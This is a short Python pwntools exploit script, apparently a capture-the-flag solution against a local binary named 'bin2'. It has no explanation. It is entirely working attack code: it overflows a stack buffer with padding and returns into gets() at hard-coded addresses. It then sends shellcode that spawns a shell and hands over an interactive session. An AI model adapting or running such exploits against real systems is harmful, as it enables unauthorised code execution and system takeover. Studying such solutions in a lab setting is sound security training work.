from pwn import *

r=process('./bin2')

elf=ELF('bin2')
getsAddr=0x804f590
hackStart=0x8048736

padding=0x40*'a'+0x4*'b'

payload1=''
payload1+=padding
payload1+=p32(getsAddr)
payload1+=p32(hackStart)
payload1+=p32(hackStart)

r.sendline(payload1)
gdb.attach(r)
r.sendline(asm(shellcraft.sh()))
r.interactive()